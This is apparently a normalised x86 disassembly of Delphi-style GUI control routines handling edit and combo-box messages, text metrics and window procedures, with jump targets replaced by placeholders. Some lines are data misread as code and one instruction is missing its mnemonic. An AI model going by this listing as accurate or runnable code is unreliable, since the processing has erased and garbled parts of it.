je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_4034a4
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_442618
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44bd1c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_44267c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_442709
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442710
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464224
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_4034a4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_442760
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44edd8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_44c008
mov edx 0x19
mov eax esi
call sub_44c02c
mov dl 0x1
mov eax esi
call sub_4532ec
xor edx edx
mov eax esi
call sub_44ca38
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_442e8c
mov eax esi
test bl bl
je r-xdata
sub_442808
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_442888
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_4428cc
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4530b8
push eax
call SendMessageA
test eax eax
setne bl
sub_442904
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4530b8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44293c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4429b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429c0
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax ebx
call sub_44c850
sub_4429c4
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4533bc
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4530b8
push eax
call SendMessageA
sub_442a00
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_442a24
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_442a44
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_442a74
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_442b2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44c7e8
inc eax
call sub_408c40
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_442bb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408c54
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_44c7f8
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442bbd
mov eax [ ebp - 0xc ]
call sub_408c8c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_442bc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404128
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_44c7e8
inc eax
call sub_408c40
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_442c56
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408c54
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c7f8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408c8c
retn
sub_442c64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ff44
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44fe70
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_442d1d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_450240
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_450240
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_442d90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_442dcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_450070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dd6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_442dd6
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_442904
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_442e50
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SendMessageA
sub_442e50
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_442e8c
pop ebx
retn
sub_442e8c
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_4244b8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_44c02c
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_442f58
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_450c30
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_442f90
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4530b8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4530b8
push eax
call SendMessageA
sub_442fd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d0
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_442e50
mov eax ebx
call sub_450658
sub_443004
push ebx
mov ebx eax
mov eax ebx
call sub_452614
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_442e8c
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_44304c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45246c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_442b10
sub_443088
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_4034a4
push 0xfffffff0
mov eax esi
call sub_4530b8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4430c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4541b8
pop esi
pop ebx
retn
sub_4430f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44315e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443165
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419e1c
sub_443170
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_443194
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404684
mov edx esi
xchg edx eax
call sub_404684
mov eax [ esi ]
call sub_4044f8
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4431ec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_443250
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44c874
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44c8a4
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443257
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_44325c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_44327c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4432a4
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44cde8
sub_4432d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44334b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4044f8
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443352
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_44335c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4433cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4044f8
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_4530b8
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4433d6
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_4433dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44edd8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_44c008
mov edx 0x19
mov eax ebx
call sub_44c02c
mov dl 0x1
mov eax ebx
call sub_4532ec
xor edx edx
mov eax ebx
call sub_44ca38
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44b428
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_443780
call sub_421fec
mov [ ebx + 0x24c ] eax
push ebx
push sub_443878
call sub_421fec
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4434d0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_464120
mov eax [ esi + 0x24c ]
call sub_464120
mov eax [ esi + 0x208 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ef08
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_443552
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4504ac
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_44359c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4435c0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4530b8
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4530b8
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_443608
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_443634
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
sub_443670
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_4533bc
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_4530b8
push eax
call SendMessageA
sub_4436c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4530b8
push eax
call SetWindowTextA
sub_4436fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_44359c
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_443734
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4526d0
pop esi
pop ebx
retn
mov eax ebx
call sub_450658
sub_443758
push ebx
mov ebx eax
mov eax ebx
call sub_44e49c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443780
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_464294
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44c3b8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d38
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44cf6c
jmp r-xdata
sub_4438ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443b63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451f0c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451ff4
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44359c
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dae4
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4034a4
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_464294
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441aac
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4520bc
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44359c
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4435c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_443b88
push ebx
push esi
push edi
